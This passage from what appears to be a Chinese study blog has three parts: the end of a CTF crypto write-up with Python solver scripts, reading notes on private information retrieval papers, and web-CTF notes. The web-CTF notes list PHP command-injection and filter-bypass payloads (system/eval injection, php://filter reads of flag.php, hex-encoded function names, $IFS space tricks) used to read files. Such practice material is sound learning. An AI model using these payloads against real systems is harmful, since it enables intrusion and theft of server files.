requests.post(<span class="string">&quot;http://03.cr.yp.toc.tf:11117/m209/encipher&quot;</span>,</span><br><span class="line">                               data=&#123;</span><br><span class="line">                                   <span class="string">&quot;plain&quot;</span>: pre + ch</span><br><span class="line">                               &#125;).json()[<span class="string">&quot;cipher&quot;</span>]</span><br><span class="line"></span><br><span class="line">        cipher = cipher.replace(<span class="string">&quot; &quot;</span>, <span class="string">&quot;&quot;</span>)[<span class="number">10</span>:-<span class="number">10</span>]        <span class="comment"># remove head and tail</span></span><br><span class="line">        <span class="built_in">print</span>(cipher)</span><br><span class="line">        <span class="keyword">if</span> cipher[i] == c:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;flag[i] is&#x27;</span>, ch)</span><br><span class="line">            <span class="keyword">return</span> ch</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i, c <span class="keyword">in</span> <span class="built_in">enumerate</span>(ct):</span><br><span class="line">    flag += rua(c, i)</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>
<p>这个是发现了规律的</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_ciphertext</span>(<span class="params">s</span>):</span><br><span class="line">    url = <span class="string">&quot;http://03.cr.yp.toc.tf:11117/m209/encipher&quot;</span></span><br><span class="line">    data = &#123; <span class="string">&quot;plain&quot;</span>: s &#125;</span><br><span class="line">    res = requests.post(url, data)</span><br><span class="line">    <span class="keyword">return</span> json.loads(res.text)[<span class="string">&quot;cipher&quot;</span>]</span><br><span class="line"></span><br><span class="line">st = <span class="string">&quot;IISNJ IFFAA TYPMO WDJHA ZMNBD LKUAY TYPVD UGAYU OQMOO YRVUS SLFZI IXKVW LYUGT JWTYV XNEYU HLQVV IXUMJ BKNUQ WMLQT QKIWV UXOCA CVSPG UKJQG XCSFI RJEKU BWLBM AVRFW DMOPT VFXTD VROND XSEHF ZLWEJ VOVSX IISNJ IFFAA&quot;</span></span><br><span class="line"></span><br><span class="line">en = <span class="string">&quot;A&quot;</span> * <span class="number">155</span></span><br><span class="line">en = get_ciphertext(en)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(st))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(en))</span><br><span class="line">res = <span class="string">b&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(st)):</span><br><span class="line">    <span class="keyword">if</span> st[i] == en[i] <span class="keyword">and</span> st[i] == <span class="string">&quot; &quot;</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    cc = <span class="built_in">bytes</span>([(<span class="built_in">ord</span>(en[i]) - <span class="built_in">ord</span>(st[i])) % <span class="number">26</span> + <span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>)])</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&quot;Z&quot;</span> == cc:</span><br><span class="line">        res += <span class="string">b&quot; &quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        res += cc</span><br><span class="line"><span class="built_in">print</span>(res)  </span><br></pre></td></tr></table></figure>
<p>CCTF{OOJMPMDDIXCLNNWFTEJUMFXKBRVVMOPSLSSLUTXVDVNDMYYPHPWFJRNJBVBOMUYR}</p>
<h1 id="medium">MEDIUM</h1>
<h2 id="aniely">Aniely</h2>
<p>key = passphrase^flag</p>
<p>enc = passphrase ^ E(key)^rand</p>
<p>rand = urandom(2) * 16</p>
<p>flag开头两字节为'CC'</p>
<p>因此rand可求</p>
<h2 id="diploma">Diploma</h2>
<h2 id="oak-land">Oak land</h2>
<h2 id="cantilever">Cantilever</h2>
<h2 id="side-step">Side step</h2>
<h2 id="faonsa">Faonsa</h2>
<h2 id="resign">Resign</h2>
<h2 id="dbb">DBB</h2>
<h2 id="fiercest">Fiercest</h2>
<h2 id="mino">Mino</h2>
<h2 id="starter-ecc">Starter ECC</h2>
<h1 id="medium-hard">MEDIUM-HARD</h1>
<h2 id="watery-soup">Watery soup</h2>
<h2 id="loyal">313 Loyal</h2>
<h2 id="soda">Soda</h2>
<h2 id="sparse">Sparse</h2>
<h2 id="larisa">Larisa</h2>
<h2 id="shaim">Shaim</h2>
<h2 id="lagima">Lagima</h2>
<h2 id="versace">Versace</h2>
<h1 id="hard">HARD</h1>
<h2 id="persian-cat">Persian cat</h2>
<h2 id="nlcs">NLCS</h2>
<h2 id="gsdp">GSDP</h2>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>RSA</tag>
        <tag>math</tag>
      </tags>
  </entry>
  <entry>
    <title>PIR</title>
    <url>/2022/08/03/2022/PIR/</url>
    <content><![CDATA[<p><strong>Private Information Retrieval</strong></p>
<span id="more"></span>
<h1 id="introduction">introduction</h1>
<p>Henry Corrigan-Gibbs and Dmitry
Kogan二人提出了一个新的PIR方案，使得处理时间变为了对数多项式/次线性级别，并且没有增加开销。</p>
<p><img src="/images/PIR/image-20220803103926186.png" alt="image-20220803103926186"></p>
<p><code>Our idea is to push the (necessary) linear-time server-side computation into a query-independent offlfflffline phase, which allows a subsequent online phase to complete in sublinear time</code></p>
<ol type="1">
<li>In an <strong>offline</strong> phase, which takes place before the
client has decided which bit of the database it wants to retrieve, the
client fetches a one-time-use “hint” from the database servers.</li>
<li>In a subsequent <strong>online</strong> phase, which takes place
after the client has decided which bit of the database it wants to
retrieve, the client sends a query to the database servers. Given the
servers’ answers to this query, along with the hint prefetched earlier,
the client can recover its database bit of interest.</li>
</ol>
<h2 id="notation">notation</h2>
<p>$$ N : the;set ;of ;positive ;integers\</p>
<p>n : the ;set ;{1, 2, . . . , n}\</p>
1^n : 长度为n的全为1的二进制字符\ s-subset of [n] :
a;subset;of;size;exactly;s\
<span class="math display">\[\begin{pmatrix}
[n]\\
s
\end{pmatrix}\]</span>
<p>:the;set;of;all;s-subsets;of;[n]\ xS:
choosing;x;independently;and;uniformly;at; random;from;the;set;S\ xD:
choosing;x ∈ S; according ;to ;distribution ;D\ For;p ∈ [0,
1],xBernoulli(p): choosing ;the ;bit ;b ;to; be ;‘1’ ;with ;probability
;p ;and ;‘0’; with ;probability ;1 − p $$</p>
<h1 id="puncturable-pseudorandom-sets"><strong>Puncturable pseudorandom
sets</strong></h1>
<p>非常重要的一个概念</p>
<p>还有术语“puncturable pseudorandom function（puncturable PRF）” and
"puncturable pseudorandom set(PRPs)"</p>
<p>PRF key与函数f: [n] -&gt; [n]密切相关 <span class="math display">\[
a\;PRF\;key\;punctured \;at \;point\;x^∗ ∈ [n]\; allows \;its \;holder
\;to \;evaluate \;f \;at \;every \;point \;in\; [n],\; \\except\; at\;
the\;punctured\; point\; x^∗
\]</span> 也就是说punctured key不能对它的持有者揭示任何有关<span class="math display">\[f(x^*)\]</span>的信息</p>
<p>同样的， the key for a puncturable pseudorandom set is a compressed
representation of a pseudorandom set <em>S</em> <em>⊆</em> [<em>n</em>].
The set key punctured at element <span class="math display">\[ x^∗ ∈ *S*
\]</span>allows its holder to recover all elements of <em>S</em>
<em>except</em> the punctured element<span class="math display">\[ x^∗
\]</span>. The punctured set key reveals nothing about <span class="math display">\[x^∗ \]</span>to its holder, apart from that fact
that <span class="math display">\[x^∗\]</span> is not one of the
remaining elements in <em>S</em>.</p>
<h2 id="defifinitions"><strong>Defifinitions</strong></h2>
<p>2.1部分介绍了三个重要算法 <span class="math display">\[
设s: N\rightarrow N的函数满足s(n)\leq n.\\
A\;puncturable\; pseudorandom\;set \;with \;set \;size\; s\; consists\;
of \;a\; key\; space \;K\\
a \;punctured-key \;space\; K_p\\
\]</span></p>
<p>下面三个算法：</p>
<ol type="1">
<li><span class="math display">\[Gen(1^\lambda,n)\rightarrow
sk：传入\lambda 和size n，输出一个set \;key \;sk \in N\]</span></li>
<li><span class="math display">\[Punc(sk, i)\rightarrow sk_p：输入sk\in
K 和i \in [n]，输出一个punctured  \;set \; key  \;sk_p \in
K_p\]</span></li>
<li><span class="math display">\[Eval(sk）\rightarrow S：输入key \in K
\bigcup K_p, 输出一个集合S \subseteq [n]\]</span></li>
</ol>
<p><strong>效率：</strong>对任何的安全参数<span class="math display">\[
\lambda \in N \]</span>，上述三个算法以 <span class="math display">\[s(n) * poly(\lambda, log
n)\]</span>的时间运行</p>
<p><strong>正确性</strong>：对任何<span class="math display">\[ \lambda
, n \in N\]</span> ，设取样<span class="math display">\[sk \leftarrow
Gen(1^\lambda, n)\]</span>，计算<span class="math display">\[S
\leftarrow Eval(sk)\]</span>，一定有以下：</p>
<ol type="1">
<li><span class="math display">\[S \in \begin{pmatrix}
[n]\\
s
\end{pmatrix}\]</span></li>
<li><span class="math display">\[对任意i \in S，Eval(Punc(sk, i)) = S
\backslash \{i\}\]</span></li>
</ol>
<p><strong>安全性</strong>：首先引入Game 1 $$ Game ;1(Puncturable
;pseudorandom ;set ;security).\ For ;,n N, and ;a ;puncturable
;pseudorandom ;set;=(Gen, Punc, Eval)\
定义如下在挑战者和对手之间的游戏：\ -The;challenger;executes;the
;following ;steps:\ <span class="math display">\[\begin{align}\
    &amp;1.sk \leftarrow Gen(1^\lambda,n)&amp;\\
    &amp;2.S \leftarrow Eval(sk)&amp;\\
    &amp;3.x^*\stackrel{R}{\longleftarrow}S&amp;\\
    &amp;4.sk_p\stackrel{R}{\longleftarrow}Punc(sk, x^*)&amp;\\
    
    并将1^\lambda和sk_p发送给对手。\\
-对手输出一个整数x^{&#39;} \in [n]\\
如果x^{&#39;} = x^*则认为对手获胜
\end{align}\]</span>^*则认为对手获胜 \end{align} $$ <img src="/images/PIR/image-20220803131344272.png" alt="image-20220803131344272"></p>
<p>这里没太看懂。。</p>
<h2 id="constructions"><strong>Constructions</strong></h2>
<p>关于2.2部分，个人的浅薄理解是给出了一些存在性的证明，如下所述。 <span class="math display">\[
Fact\;2 \;(Perfectly \;secure \;puncturable \;pseudorandom\; set with\;
linear-sized\; keys):\\
对任何函数s:N \rightarrow N \;with\;s(n) \leqslant n,\;总有一个perfectly
\;secure\; puncturable\; pseudorandom \;set \;with \;set \;size \;s\\
以及，对确定的n来说，the \;set\; keys \;and \;punctured\;
keys\;的大小都是(s(n)+O(1))log\;n bits
\]</span></p>
<p>$$ <span class="math display">\[\begin{align}\
&amp;Theorem \;3 \;(puncturable\; pseudorandom\; set\; with\; short
\;keys \;from\; puncturable\; PRFs):&amp;\\

&amp;\quad假设存在一个\epsilon_F-secure\;puncturable\;PRF,它对于安全的参数\lambda和输入的n,
有长度为\kappa(\lambda,n)的keys和长度为\kappa_p(\lambda,n)&amp;\\
&amp;\quad的punctured\;keys,那么存在一个大小为\Theta(\sqrt{n})的\epsilon-secure
\;puncturable \;pseudorandom \;set，对于\lambda和n，有：&amp;\\
    &amp;\qquad1.set\; keys\; of\; length\; κ(λ, n) + O(log \;n)\;
bits\; and&amp;\\
    &amp;\qquad2.punctured\; keys\; of \;length\; κ_p(λ, n) + O(log
\;n)\; bits, and&amp;\\
    &amp;\qquad3.\epsilon(λ, n) = poly(λ, n) · ( \epsilon_F +
2^{−λ}).&amp;\\
\end{align}\]</span>3.(λ, n) = poly(λ, n) · ( _F + 2^{−λ}).&amp;\
\end{align} $$</p>
<p>然后构造了一个puncturable pseudorandom set来证明上述Theorem： $$
Construction;4 ;(Puncturable; pseudorandom ;set ;from ;puncturable
;PRF).\ Given; a ;puncturable; PRF ;F = (PRFGen, PRFPunc, PRFEval),\ we;
construct ;a ;puncturable ;pseudorandom; set ;_F = (Gen, Punc,
Eval);with; set ;size; s(n) ;:= \ <span class="math display">\[\begin{align}\
&amp;\psi_F.Gen(1^\lambda, n) \rightarrow sk&amp; \\
    &amp;\quad-重复以下最多\lambda次：&amp;\\
        &amp;\qquad ·k \leftarrow PRFGen(1^\lambda, n).&amp;\\
        &amp;\qquad ·计算S \leftarrow
{PRFEval(k,1),PRFEval(k,2),···，PRFEval(k,s(n))}&amp;\\
        &amp;\qquad ·如果|S| = s(n),停止并输出sk
\leftarrow(n,k).输出⊥（这里没懂，输出垂直？）&amp;\\
    &amp;\quad-在运行\lambda次后循环不成功，输出⊥&amp;\\\\

&amp;\psi_F.Punc(sk,i) \rightarrow sk_p&amp; \\
    &amp;\quad-将密钥解析成(n, k).&amp;\\
    &amp;\quad-找到最小的l满足PRFEval(k,l)=i.&amp;\\
        &amp;\qquad\;如果不存在这样的l，输出⊥&amp;\\
    &amp;\quad-计算k_p \leftarrow PRFPunc(k,l),并输出sk_p \leftarrow
(n,k_p).&amp;\\\\
&amp;\psi_F.Eval(sk) \rightarrow S&amp; \\
    &amp;\quad-将密钥解析成(n,k).&amp;\\
    &amp;\quad-输出集合S \leftarrow
{PRFEval(k,1),PRFEval(k,2),···，PRFEval(k,s(n))}.&amp;\\
    &amp;\quad-(If \;k\; is\; punctured \;at\; some \;value, \;skip\;
this \;value\; when\; computing\; S).&amp;\\
\end{align}\]</span>(If ;k; is; punctured ;at; some ;value, ;skip; this
;value; when; computing; S).&amp;\ \end{align} <span class="math display">\[
注意：Gen失败的概率很小，但不代表不会失败，我们可以让sk=⊥是某些固定的集合（例如[s])来保证上述theorem完全正确。
\]</span> Corollary;6. ;Assuming; that ;pseudorandom ;generators;
(PRGs); exist,\ there ;exists; ;a ;secure ;puncturable; pseudorandom
;set; with ;set ;size; Θ() $$ theorem 7引入了一个fast membership
testing的概念，涉及到一个InSet函数，运行速度是poly的，其实就是判断i是否在PRPs.Eval(sk)中，不展开写了。</p>
<h2 id="shifting-puncturable-pseudorandom-sets"><strong>Shifting
puncturable pseudorandom sets</strong></h2>
<p>引入了两个PRPs的性质： <span class="math display">\[
\begin{align*}
&amp;1.GenWith(1^\lambda,n,i) \rightarrow sk,\;输出的sk满足i\in
Eval(sk)&amp;\\
&amp;2.Shift(sk, \delta) \rightarrow
sk^{&#39;}，即输出的sk^{&#39;}满足Eval(sk^{&#39;}) = {i+\delta\;|\;i \in
Eval(sk)},对Eval的结果做了一个shift&amp;
\end{align*}
\]</span></p>
<p>不失一般性，可以假设任何PRs都有这两条性质</p>
<h1 id="two-server-pir-with-sublinear-online-time"><strong>Two-server
PIR with sublinear online time</strong></h1>
<h2 id="defifinition"><strong>Defifinition</strong></h2>
<p>分为这五步： <span class="math display">\[
\begin{align}\
    &amp;1.client使用Setup算法生成密钥ck和hint\;q_h，发送q_h给offline\;server。注意Setup算法可提前运行。
&amp;\\
    &amp;2.offline\;server接收到q_h后运行Hint算法，生成hint\;h并发给clinet。
&amp;\\
    &amp;3.client决定index\;i后，传ck和i给Query算法，生成query\;q并发给online\;server。
&amp;\\
    &amp;4.online\;server传q给Answer算法，算出a返回给client。 &amp;\\
    &amp;5.client传h和a到Reconstruct算法，输出数据库的第i个比特。
&amp;\\
\end{align}
\]</span> 综上，offline/online PIR scheme是五个算法（Setup, Hint, Query,
Answer, Reconstruct)组成的五元组： <span class="math display">\[
\begin{align}\
    &amp;Setup(1^\lambda,n) \rightarrow(ck, q_h)，\lambda是安全的参数
&amp;\\
    &amp;Hint(x,q_h) \rightarrow h，x是数据库中的n个数据 &amp;\\
    &amp;Query(ck,i) \rightarrow q &amp;\\
    &amp;Answer^x(q) \rightarrow a &amp;\\
    &amp;Reconstruct(h,a) \rightarrow x_i &amp;\\
\end{align}
\]</span></p>
<h2 id="new-constructions"><strong>New constructions</strong></h2>
<p>基本上是从原始PIR到计算安全的PIR再到加入可穿刺的伪随机集的PIR版本</p>
<p>下图给了运行效率的上界，后面也说了如果只考虑计算安全（舍弃数据统计安全）就能降低开销。</p>
<p><img src="/images/PIR/image-20220828145823279.png" alt="image-20220828145823279"></p>
<p>Two-server computational offlfflffline/online PIR:</p>
<p><img src="/images/PIR/image-20220828150129012.png" alt="image-20220828150129012"></p>
<p>引入puncturable pseudorandom sets后，PIR的效率可进一步提高：</p>
<p><img src="/images/PIR/image-20220828151023565.png" alt="image-20220828151023565"></p>
<h3 id="construction-16-two-server-pir-with-sublinear-online-time"><strong>Construction
16</strong> <strong>(Two-server PIR with sublinear online
time)</strong></h3>
<p><span class="math display">\[
\begin{align}
&amp;还是那些配置:s:N \rightarrow N ,\psi = (Gen, Punc,
Eval)\;with\;key\;space K,punctured-key\;space\; K_p,&amp;\\
&amp;extended\;by\;routines(Shift,GenWith),\;Throughout, let\;m :=
(n/s(n))log\;n. &amp;\\
&amp;Offline\;phase: &amp;\\
    &amp;\quad Setup(1^\lambda,n) \rightarrow ck,q_h: &amp;\\
        &amp;\qquad sk \leftarrow Gen(1^\lambda,n) &amp;\\
        &amp;\qquad sample\;\delta_1,...,\delta_m
\stackrel{R}{\longleftarrow}[n]&amp;\\
        &amp;\qquad ck \leftarrow (sk,\delta_1,...,\delta_m)&amp;\\
        &amp;\qquad output\;ck\;and\;q_h \leftarrow sk&amp;\\\\
    &amp;\quad Hint(q_h,x \in \{0,1\}^n)\rightarrow h \in \{0,1\}^m
&amp;\\
        &amp;\qquad parse\;q_h\;as\;sk \in K\;and\;\delta\in [n]^m
&amp;\\
        &amp;\qquad for\;j=1,...,m\;do:&amp;\\
            &amp;\qquad\quad S_j \leftarrow
Eval(Shift(sk,\delta_j))&amp;\\
            &amp;\qquad\quad h_j \leftarrow \sum_{i\in
S_j}x_i\;mod\;2&amp;\\
           &amp;\qquad output\;h \leftarrow(h_1,...,h_m)&amp;\\\\
&amp;Online\; phase &amp;\\
    &amp;\quad Query(ck, i\in [n]) \rightarrow q\in K_p&amp;\\
        &amp;\qquad parse\;ck\;as\;sk\in K\;and\;\delta\in[n]^m&amp;\\
        &amp;\qquad
sample\;a\;bit\;b\stackrel{R}{\longleftarrow}Bernouli(\frac{s-1}{n})&amp;\\
        &amp;\qquad find\;a\;j\in[m]\;s.t.\;i-\delta_j \in
Eval(sk)&amp;\\
        &amp;\qquad if\;such\;a\;j\in[m]\;exists:&amp;\\
            &amp;\qquad\quad sk_q \leftarrow Shift(sk,\delta_j)&amp;\\
        &amp;\qquad otherwise:&amp;\\
            &amp;\qquad\quad j \leftarrow ⊥&amp;\\
            &amp;\qquad\quad i^{&#39;} \stackrel{R}{\longleftarrow}
Eval(sk)&amp;\\
            &amp;\qquad\quad sk_q \leftarrow Shift(sk,
i-i^{&#39;})&amp;\\
        &amp;\qquad if\;b=0:\qquad i_{punc} \leftarrow i&amp;\\
        &amp;\qquad else: \qquad\quad\;\;\; i_{punc}
\stackrel{R}{\longleftarrow} Eval(sk_q)\backslash \{i\}&amp;\\
        &amp;\qquad output\;q \leftarrow Punc(sk_q, i_{punc}) &amp;\\\\
    &amp;\quad Answer^x(q\in K_p )\rightarrow a\in\{0,1\}&amp;\\
        &amp;\qquad S \leftarrow Eval(q)&amp;\\
        &amp;\qquad return a \leftarrow \sum_{i\in
S}x_i\;mod\;2&amp;\\\\
    &amp;\quad Reconstruct(h\in \{0,1\}^m,a\in \{0,1\}) \rightarrow x_i
&amp;\\
        &amp;\qquad let\;j \;and\;b\;be\;as\;in\;Query&amp;\\
        &amp;\qquad if\;j=⊥\;or\;b=0\;then\;output\;⊥ &amp;\\
        &amp;\qquad output\;x_i\leftarrow h_j-a\;mod\;2 &amp;\\
\end{align}
\]</span></p>
<p>读paper的总结：</p>
<h1 id="private-information-retrievalwith-sublinear-online-time"><strong>Private
Information Retrievalwith Sublinear Online Time</strong></h1>
<p>第一篇，是Henry Corrigan-Gibbs和Dmitry
Kogan二人写的，将PIR的过程拆成离线和在线阶段，并puncturable pseudorandom
sets（后写为PRS）的概念引入其中，线性的计算放到离线阶段，使在线阶段的计算只有次线性的，而且没有引入额外的存储（其实我觉得是有的，毕竟client生成n<sup>(1/2)个同样大小的sets，还是生成了n的存储量，并且这些sets都要发给离线服务器算出hint，使得离线阶段的传输量是n；但是在在线阶段确实不需要更多的存储了，传输带宽也只是n</sup>(1/2)大小的)</p>
<p>总的来说，关键点是可穿刺的伪随机集，它能去掉某一点的信息，并且在客户端能恢复该点。原始的PRS有三个功能函数，(Genn(1^<em>λ</em>
<em>, n</em>), Punc(sk<em>, i</em>), Eval(sk<em>,
i</em>))，通过输入安全参数λ和数据库大小n，Gen函数生成一个密钥，Punc函数进行穿刺，Eval函数密钥sk变成集合S；后面还加了两个功能函数GenWith(1^<em>λ</em>
<em>, n, i</em>)和Shift(sk<em>,
δ</em>)，GenWith用于生成有指定元素的密钥，Shift就和它函数名一样，对密钥在有限域下进行一个加操作。</p>
<p>之后就是用前面所提出的PRS融入到PIR方案中，大致的流程如下：</p>
<ol type="1">
<li>client在随机的概率分布下生成n<sup>(1/2)个大小为n</sup>(1/2)的集合S，全部发给离线计算服务器计算异或值返回给client</li>
<li>找一个存在x的集合S_i，对其进行穿刺（可以当作找到并丢弃x），然后发给在线服务器，返回去掉x的异或值</li>
<li>把1和2的结果进行异或，即可抵消其他的值，只留下x。由于两个服务器是不可进行交流的，因此可以两个服务器无法获取有关x的信息。</li>
<li>如果要进行多次取值，那就多了一个人refresh操作更新密钥，即将刚刚用过的S更新否则再次使用会被发现。具体方法是在2同时生成一个集合S‘，对其进行x的穿刺然后发给离线服务器，再得到S’的异或值，拿到后将这个异或值与x异或就可以得到S‘的hint</li>
</ol>
<p>后面还介绍了单服务器的情况，因为离线在线阶段在一个服务器上了，所以不能直接发集合过去，否则也会被发现。文中引入了全同态加密来描述，利用全同态方案对S进行加密再发给服务器，之后的步骤和上述差不多。</p>
<h1 id="efficient-transformation-capabilities-of-single-database-private-block-retrieval"><strong>Efficient
Transformation Capabilities of Single Database Private Block
Retrieval</strong></h1>
<p>这一篇的思路和第一篇就很不一样了，没有采用离线/在线服务器的模式，也没有使用穿刺伪随机集，他基于一个NP问题即二次剩余构造单项陷门函数，和rabin系统类似，因此可以一次性获得一个block的数据（该文中把数据库当成u*v的矩阵数据，一次可以获得某一行的数据）。</p>
<p>在这篇里面学到了两个概念，<em>Information-theoretic
PIR</em>和<em>Computationally bounded PIR</em>
，第一篇虽然没有介绍但是也用到了，当时就没看懂。信息论的PIR指存在多个服务器，它们享有同一个数据库的copy但相互之间不进行沟通；计算有界的PIR是指基于某个密码假设的PIR方案。</p>
<p>这篇的实现就是利用加科比符号和二次剩余，具体就不展开了了，对我们要的研究方向不太一样。而且它的运算时间是线性的哈哈哈，还不如第一篇，我记得是复杂度u*v加一个log，那对于数据库大小来说就是线性的。不过他有一个优点是构造的方案可以在信息论PIR和计算有界PIR之间互相转换，这是其他方案难以做到的。</p>
<h1 id="puncturable-pseudorandom-sets-and-private-information-retrieval-with-near-optimal-online-bandwidth-and-time"><strong>Puncturable
Pseudorandom Sets and Private Information Retrieval with Near-Optimal
Online Bandwidth and Time</strong></h1>
<p>这一篇是在第一篇的基础上发展过来的，与第一篇相比，他的优点是在不增加计算时间的基础上减少了传输阶段所用的带宽：离线阶段仅传输n<sup>(1/2)大小的消息至left服务器，client收到一个n</sup>(1/2)大小的hint，在线阶段的带宽仅为O(1)，先前的O(n^(1/2))。但他采用了一种弱化PRS的方案，也即更通用的PRS，所以不像第一篇那样，这一篇存在不可忽略的概率导致结果出错，但总的来说正确率仍然保持的较高（单次2/3的正确率，并行运行128次），可是在第一篇中对x进行穿刺时仍然可能输出一个错误结果’⊥‘，所以我认为这个错误不是什么大问题。</p>
<p>既然达到了不同的效果，那么这一篇所用的Privately Puncturable
PRFs肯定与前面的不同，更一般化的 Generalized Privately Puncturable
Pseudorandom Set如下：(Gen(1^<em>λ</em> <em>, n</em>), Set(sk),
Member(sk, x), Puncture(msk, x))，
多了一个member函数用于测试x是否在sk生成的集合中，同时Gen函数不仅会生成密钥sk，还会生成主密钥msk，这个也是降低传输带宽的关键点。</p>
<p>至于实现过程，其实和第一篇大同小异，仍然是利用集合的异或来恢复x，这里面多加了个超时机制（我是这么理解的），当超时时就会返回一个默认的异或值0，这也是出错的由来。至于refresh阶段也和第一篇类似。</p>
<h1 id="batched-differentially-private-information-retrieval"><strong>Batched
Differentially Private Information Retrieval</strong></h1>
<p>这一篇也没有用穿刺伪随机集，他保留了离线在线分离的计算，自己设计了一个新的方法：
differentially
private-PIR(DPPIR)。最终的效果是把两次的运算时间变成了O(n^(1/2)+constant*n)，传输带宽是O(1)，带宽都降了不少但运算时间就变成了线性的。</p>
<p>看后面似乎运行条件也比较苛刻，需要同时多个用户查询，批处理查询才能实现这个效率，对主线帮助不大就不细看了。</p>
<h1 id="private-blocklist-lookups-with-checklist"><strong>Private
Blocklist Lookups with Checklist</strong></h1>
<p> 这一篇又是CK20两人的paper，个人感觉不是纯理论上的，而是偏应用层面了。大概就是运用PIR方案实现对服务器端的字符串匹配，判断client处的字符串是否在服务器中，并且不泄露字符串的信息，优点还有不需要存储整个blocklist（类似于第二篇，将服务器端的数据库看作是一个矩阵，每次匹配的是某一行的字符）。还能使得服务端的计算是次线性的，最关键的是——它在blocklist经常更新的时候也满足，与我们的需求类似，值得好好研读；除此之外还有一些在运算速度上的提升等等。</p>
<p>PRS的构造和第一篇的类似，是(Gen, GenWith<em>,</em> Eval<em>,</em>
Punc)，实现过程和第一篇有很大不同了。</p>
<p>大致的流程还是和第一篇类似，不过是从伯努利概型中根据(2(n^(1/2)-1)/n)的概率中生成β，在生成query查询时搞了两个方案，每个方案都有两套punctured
pseudorandom secret
key，根据β的值选择某一方案生成查询q，发给right后和第一篇是一样的，返回的answer
a也均可以完成对D_i的重构。</p>
<p>至于为什么能满足数据可更新，我目前粗浅的理解只是把数据不断分为更小的块，每次更新都使得较大的那一块保持不变而只有小块改变，因此left服务器对hint的更新不至于是O(n^(1/2))以上的。</p>
]]></content>
      <categories>
        <category>Crypto</category>
      </categories>
      <tags>
        <tag>PIR</tag>
      </tags>
  </entry>
  <entry>
    <title>web</title>
    <url>/2022/07/11/2022/web/</url>
    <content><![CDATA[<p>学点web</p>
<span id="more"></span>
<h1 id="信息收集">信息收集</h1>
<p><a href="https://blog.csdn.net/zmx2473162621/article/details/115284712">wp</a></p>
<p><a href="https://wkr.moe/ctf/447.html#web15%5B%E7%A4%BE%E5%B7%A5%5D">wp2</a></p>
<p><a href="https://blog.csdn.net/a597934448/article/details/105431367">各种泄露</a></p>
<h1 id="命令执行">命令执行</h1>
<p><a href="https://blog.csdn.net/solitudi/article/details/109837640">y4的wp</a></p>
<p>一些基本提取文件的操作：cat、nl、tac、highlight_file()、vim、vi</p>
<p>匹配：*多个字符匹配，?单个字符匹配</p>
<p>转义符：^、""、''</p>
<p>执行函数echo()、system()、passthru() 、exec()、
shell_exec()、popen()、proc_open()、pcntl_exec()</p>
<h2 id="web29">web29</h2>
<p>只过滤了flag</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">c=<span class="title function_ invoke__">system</span>(<span class="string">&quot;nl fla*&quot;</span>);<span class="comment">//匹配</span></span><br><span class="line">c=<span class="keyword">echo</span> `nl fl<span class="string">&#x27;&#x27;</span>ag.php`;<span class="comment">//转义字符</span></span><br><span class="line">c=<span class="keyword">include</span>(<span class="variable">$_GET</span>[<span class="number">1</span>]);&amp;<span class="number">1</span>=php:<span class="comment">//filter/read=convert.base64-encode/resource=flag.php</span></span><br><span class="line">c=<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="number">1</span>]);&amp;<span class="number">1</span>=<span class="title function_ invoke__">system</span>(<span class="string">&#x27;nl flag.php&#x27;</span>);<span class="comment">//因为只过滤c的flag，所以用1传参不会被过滤</span></span><br></pre></td></tr></table></figure>
<h2 id="web30">web30</h2>
<p>过滤了flag、system、php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">c=<span class="keyword">echo</span> <span class="title function_ invoke__">exec</span>(<span class="string">&#x27;nl fla?????&#x27;</span>);</span><br></pre></td></tr></table></figure>
<p>和上一问差不多</p>
<h2 id="web31">web31</h2>
<p>过滤了很多，"/flag|system|php|cat|sort|shell|.|
|'/i"（/i大小写不敏感）</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">c=<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="number">1</span>]);&amp;<span class="number">1</span>=<span class="title function_ invoke__">system</span>(<span class="string">&#x27;nl flag.php&#x27;</span>);<span class="comment">//没过滤eval，用1传参</span></span><br><span class="line">c=<span class="keyword">echo</span>(`nl%<span class="number">09</span>fl[abc]*`);<span class="comment">//%09空格转义，[abc]匹配不包含abc的文字</span></span><br><span class="line">c=<span class="string">&quot;\x73\x79\x73\x74\x65\x6d&quot;</span>(<span class="string">&quot;nl%09fl[a]*&quot;</span>);<span class="comment">//等价于system()</span></span><br><span class="line">c=<span class="keyword">echo</span>`strings\<span class="variable">$IFS</span>\$<span class="number">9</span>f*`<span class="comment">//\$IFS\$9 win下空格转义</span></span><br></pre></td></tr></table></figure>
<p>查文件路径的语法：</p>
<p>首先<code>print_r(scandir(dirname(__FILE__)));</code>查看当前目录下文件</p>
<p>然后找到flag.php
<code>print_r(next(array_reverse(scandir(dirname(__FILE__)))));</code>
之后高亮显示即可
<code>c=highlight_file(next(array_reverse(scandir(dirname(__FILE__)))));</code></p>
<p><code>c=show_source(next(array_reverse(scandir(pos(localeconv())))));</code>和上面的差不多</p>
<h2 id="web32">web32</h2>
<p>过滤的更多了：("/flag|system|php|cat|sort|shell|.|
|'|`|echo|;|(/i"</p>
